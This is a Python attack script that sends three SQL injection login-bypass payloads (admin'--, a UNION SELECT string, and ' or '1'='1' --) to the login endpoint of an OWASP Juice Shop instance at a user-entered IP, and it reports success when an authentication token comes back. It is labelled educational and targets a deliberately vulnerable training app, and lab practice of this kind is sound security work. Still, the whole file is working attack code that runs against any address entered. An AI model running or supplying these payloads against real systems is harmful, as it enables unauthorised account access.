#!/usr/bin/env python3
"""
SQL Injection Attack Script

This script tests a Juice Shop instance for common SQL injection vulnerabilities
in the login form.

For educational purposes only.
"""

import time
import requests

def test_sql_injection(target_ip, payload_username, payload_password):
    """
    Attempts a login with a given SQL injection payload.
    Returns a tuple of (success, message).
    """
    login_url = f"http://{target_ip}:3000/rest/user/login"
    
    payload = {
        "email": payload_username,
        "password": payload_password
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(login_url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_data = response.json()
            if "authentication" in response_data and "token" in response_data["authentication"]:
                return True, "SQL injection successful - bypassed login!"
            return False, "Login response received but no token found"
        return False, f"HTTP {response.status_code} - Login failed"
            
    except requests.exceptions.Timeout:
        return False, "Request timeout"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except requests.exceptions.RequestException as e:
        return False, f"Error: {str(e)}"

def main():
    """Main function to run the SQL injection attack script."""
    print("SQL Injection Attack Script")
    print("Educational use only!")
    print("")
    
    target_ip = input("Enter Juice Shop IP address: ")
    
    print(f"Testing connection to {target_ip}:3000...")
    try:
        requests.get(f"http://{target_ip}:3000", timeout=5)
        print("Connection successful!")
    except requests.exceptions.RequestException:
        print("Cannot reach target. Make sure Juice Shop is running.")
        return
    
    print("\nTesting SQL injection payloads...\n")
    
    payloads = [
        {
            "name": "Admin bypass attempt",
            "username": "admin'--",
            "password": "anything"
        },
        {
            "name": "Union injection test",
            "username": "' UNION SELECT 1,'admin','password' --",
            "password": "test"
        },
        {
            "name": "Classic OR injection",
            "username": "' or '1'='1' --",
            "password": "' or '1'='1' --"
        }
    ]
    
    successful_attacks = []
    
    for i, payload in enumerate(payloads, 1):
        print(f"[{i}/{len(payloads)}] Testing: {payload['name']}")
        print(f"  Username: {payload['username']}")
        print(f"  Password: {payload['password']}")
        
        success, message = test_sql_injection(target_ip, payload['username'], payload['password'])
        
        if success:
            print(f"  Result: SUCCESS - {message}")
            successful_attacks.append(payload['name'])
        else:
            print(f"  Result: FAILED - {message}")
        
        print("")
        time.sleep(1)
    
    print("=== Attack Results ===")
    if successful_attacks:
        print(f"Successful SQL injections: {len(successful_attacks)}")
        for attack in successful_attacks:
            print(f"  ✓ {attack}")
        print("\nWARNING: Application is vulnerable to SQL injection!")
    else:
        print("No successful SQL injections found")
        print("Application may be protected against SQL injection")
    
    print("\nAttack finished.")

if __name__ == "__main__":
    main()
